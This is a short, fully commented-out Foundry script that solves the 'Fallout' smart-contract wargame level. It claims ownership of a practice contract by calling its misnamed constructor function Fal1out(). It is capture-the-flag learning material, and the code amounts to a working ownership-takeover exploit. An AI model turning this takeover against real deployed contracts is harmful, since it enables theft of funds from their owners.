// // SPDX-License-Identifier: MIT
// pragma solidity ^0.6.0;

// // Objective
// // 1. Claim the ownership of the contract.

// import "forge-std/Script.sol";
// import "forge-std/console.sol";
// import "../src/Fallout.sol";

// contract FalloutSolution is Script {

//     Fallout public fallout = Fallout(payable(0x762e68df2BdBE79f8d8e18E1c5bd33816181e9C5));

//     function run() public {
//         vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

//         console.log("Owner Before: ", fallout.owner());

//         fallout.Fal1out();

//         console.log("Owner After: ", fallout.owner());
//         vm.stopBroadcast();
//     }

// }